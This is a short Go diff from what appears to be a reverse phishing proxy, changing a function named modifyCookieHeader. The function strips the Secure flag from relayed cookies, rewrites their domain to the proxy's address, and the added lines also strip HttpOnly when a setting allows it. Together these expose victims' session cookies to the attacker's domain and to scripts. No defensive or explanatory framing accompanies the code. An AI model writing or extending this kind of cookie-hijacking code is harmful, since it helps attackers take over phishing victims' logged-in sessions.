@@ -160,6 +160,9 @@ func (p *phishingProxy) modifyCookieHeader(response *http.Response) error {
 	rcookies := response.Cookies()
 	for _, value := range rcookies {
 		value.Secure = false
+		if !p.Reverse.CookieHttpOnly {
+			value.HttpOnly = false
+		}
 		value.Domain = p.Reverse.Address
 		mcook = append(mcook, value.String())
 		if p.Reverse.CookieDomain != "" {
